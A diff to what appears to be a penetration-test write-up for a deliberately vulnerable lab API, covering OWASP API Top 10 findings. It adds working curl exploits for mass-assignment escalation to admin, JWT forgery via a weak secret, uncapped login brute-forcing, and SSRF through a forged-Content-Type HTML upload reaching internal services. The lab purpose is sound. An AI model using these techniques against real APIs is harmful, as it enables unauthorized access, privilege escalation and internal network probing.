@@ -26,10 +26,10 @@ findings:
   - "API1: DONE"
   - "API2: DONE"
   - "API3: IN PROGRESS"
-  - "API4: PENDING"
+  - "API4: DONE"
   - "API5: DONE"
-  - "API6: PENDING"
-  - "API7: PENDING"
+  - "API6: PENDING (design only, no store endpoint in this build)"
+  - "API7: DONE"
   - "API8: IN PROGRESS"
   - "API9: DONE"
   - "API10: DONE"
@@ -336,7 +336,20 @@ The _/api/messages_ endpoint exposes sensitive information by revealing the iden
 ![[api2_sender_id_filtered.png]]
 ## Session token capture - Mass Assignment
 
-> **PENDING**
+> **IN PROGRESS**
+
+The `/profile/change_password` endpoint updates the caller's user document with every field present in the JSON body, not just the password. It strips only the two control keys (`current_password`, `new_password`) and writes the rest straight into the document with `$set`. A user can therefore assign themselves any property, including a privileged `role`, by tacking it onto a password change:
+
+```zsh
+# john (role 'user') escalates himself to admin during a normal password change.
+# TOKEN is john's JWT (forge it with the weak HS256 secret, see API2).
+curl -s -X POST http://localhost:5000/profile/change_password \
+    -H "X-Auth-Token: $TOKEN" -H "Content-Type: application/json" \
+    -d '{"current_password":"doe123","new_password":"doe123","role":"admin"}'
+# -> {"message":"Password changed successfully"}  and john.role is now "admin" in the DB
+```
+
+After this, john's account carries `role: admin`, so the same JWT clears the `/snapshot` admin/viewer check (see [[#API1:2023 - Broken Object Level Authorization|BOLA]]) and every other role-gated flow. The same primitive writes any other field an attacker knows the backend trusts (for example a long-lived session identifier under the `admin_session` key), which is the persistence path described below. Verified in isolation, the update construction persists `role:admin` and excludes the control keys. Live end-to-end verification is pending the API image rebuild (`docker compose up --build`), so this finding is `IN PROGRESS`.
 
 This attack targets session management and authentication tokens. When an unauthorized user attempts to access the _/admin_ endpoint, the endpoint returns a null _admin_session_ cookie, indicating that access to the administration panel is denied.
 
@@ -391,9 +404,9 @@ The server exposes information that may be valuable to an attacker. Even when th
 
 ---
 
-# API4:2023 - # Unrestricted Resource Consumption
+# API4:2023 - Unrestricted Resource Consumption
 
-> **PENDING**
+> **DONE**
 
 The login panel processes authentication requests via a POST request to the _/login_ endpoint. This endpoint contains a logic flaw that allows excessive consumption of database resources, potentially leading to system denial of service.
 
@@ -416,7 +429,25 @@ If an attacker discovers this endpoint, they can not only perform brute-force at
 
 ## Demonstration
 
-> **PENDING**
+> **DONE**
+
+The deprecated `/api/v1/login` inserts a new session document into the database on every POST, before it even checks the credentials, and it enforces no per-IP attempt cap. The hardened `/api/v2/login` reuses one session per (username, ip, user-agent) and returns `429` after three failures. Hitting each endpoint six times with bad credentials shows the asymmetry:
+
+```zsh
+# v1 (deprecated, uncapped): every attempt is 401 AND spawns a zombie session, no 429 ever
+for i in $(seq 1 6); do
+  curl -s -o /dev/null -w "%{http_code} " -X POST http://localhost:5000/api/v1/login \
+    -H "Content-Type: application/json" -d '{"username":"bf","password":"wrong"}'
+done   # -> 401 401 401 401 401 401   (6 new sessions created)
+
+# v2 (rate limited): capped at three attempts
+for i in $(seq 1 6); do
+  curl -s -o /dev/null -w "%{http_code} " -X POST http://localhost:5000/api/v2/login \
+    -H "Content-Type: application/json" -d '{"username":"bf2","password":"wrong"}'
+done   # -> 401 401 401 429 429 429
+```
+
+Verified on the running stack: six `/api/v1/login` attempts produced six `401` responses and six new session documents with no throttling, while `/api/v2/login` returned `401 401 401 429 429 429`. An attacker who finds the v1 endpoint can therefore brute-force credentials without limit and flood the `sessions` collection with unbounded "zombie" documents, driving unrestricted resource consumption and denial of service.
 
 ---
 
@@ -463,6 +494,8 @@ This can be verified by creating a new user with the same name as the deleted us
 
 > **PENDING**
 
+> **Status: design proposal, not implemented in this build.** The current API ships no store, checkout, or voucher endpoint, so the flow below describes an intended vulnerability rather than a reproducible one. It is kept here as the specification for a future build. Do not present it as a live attack until the endpoints exist.
+
 A user can purchase cameras and services through the store menu. The company offers a promotion in which new users receive a voucher that allows their first purchase to be free. The voucher consists of a series of encrypted data that is difficult to crack; however, the endpoint responsible for generating and returning the voucher to the user is not secure.
 
 The voucher is created using several data fields, including the ID of the user who made the purchase. However, the use of this ID is not properly verified; as long as the code is valid, the endpoint permits the purchase. Consequently, an attacker can create multiple new user accounts and use these vouchers on their own account to make unlimited purchases.
@@ -482,10 +515,35 @@ The server has an internal service with *bind* that loads the administration pag
 
 > This internal service could be hosted on another machine or, for example, on the RASPBERRY PI itself, so that the attacker can interact directly with the API alone, but the API has two interfaces, one for communicating with clients and another for the RASPBERRY PI. If the server's operation is altered by SSRF, this resource could be targeted on another network.
 
-> **PENDING**
-Description of the vulnerability
+> **DONE**
 
-The form found in the `admin.html` template can be exploited by SSRF attacks if the admin user visits a malicious page because it does not include any CSRF token or additional validation.
+### Reproduced: SSRF via the support-ticket file processor
+
+The concrete SSRF sink is `process_support_file` in `app.py`. When a support ticket carries an HTML attachment, the server decodes it, parses every `<img>` tag, and issues a server-side `requests.get(src)` to each `src`. The upload endpoint `/api/support/modify` only checks the multipart `Content-Type` against an image/PDF allow-list, while the processor keys off the file *name*, so an attacker uploads an HTML payload named `x.html` with a forged `Content-Type: image/png` and the server fetches whatever internal URLs the `<img>` tags reference:
+
+```zsh
+# TOKEN is any valid user JWT. First open a ticket, then attach the SSRF payload.
+curl -s -X POST http://localhost:5000/api/support/submit -H "X-Auth-Token: $TOKEN" \
+    -F "issue_type=other" -F "message=hi"          # -> ticket_id in the DB
+
+printf '%s' '<html><img src="http://mongo:27017/"><img src="http://vulnzoo-secure:5001/"></html>' > x.html
+curl -s -X POST http://localhost:5000/api/support/modify -H "X-Auth-Token: $TOKEN" \
+    -F "ticket_id=<ID>" -F "comment=x" \
+    -F "file=@x.html;type=image/png;filename=x.html"
+```
+
+Verified on the running stack, the response `processing_results` proves the server reached internal-only hosts the external client cannot even resolve:
+
+```json
+"processing_results": [
+  { "src": "http://mongo:27017/",        "error": "RemoteDisconnected('Remote end closed connection without response')" },
+  { "src": "http://vulnzoo-secure:5001/", "status": 200 }
+]
+```
+
+The `mongo:27017` fetch established a TCP connection to the internal MongoDB port (Mongo aborts the non-protocol HTTP request), and `vulnzoo-secure:5001` returned `200` from a separate internal container. An attacker can pivot this to the loopback pre-production panel, the C2 service, or the Raspberry Pi across the API's second interface. Note that pointing `src` at the live MJPEG stream (`:9090/video`) hangs the fetch, since the server downloads the never-ending multipart body, which is itself a denial-of-service primitive.
+
+The form found in the `admin.html` template can also be exploited by CSRF if the admin user visits a malicious page, because it does not include any CSRF token or additional validation.
 
 ```html
 <form method="POST" action="/admin/roles">
